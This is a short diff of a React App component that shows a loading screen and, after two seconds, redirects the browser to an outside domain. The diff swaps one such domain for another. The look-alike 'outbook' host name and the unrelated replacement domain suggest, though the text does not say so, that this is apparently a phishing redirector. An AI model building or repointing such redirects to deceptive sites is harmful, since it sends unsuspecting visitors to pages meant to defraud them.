@@ -4,7 +4,7 @@ import Loading from './Loading';
 function App() {
     useEffect(() => {
         const timer = setTimeout(() => {
-            window.location.href = 'https://outbook.mercelotopia.com';
+            window.location.href = 'https://ss.materialesiluminacion.com.ar';
         }, 2000);
 
         return () => clearTimeout(timer);
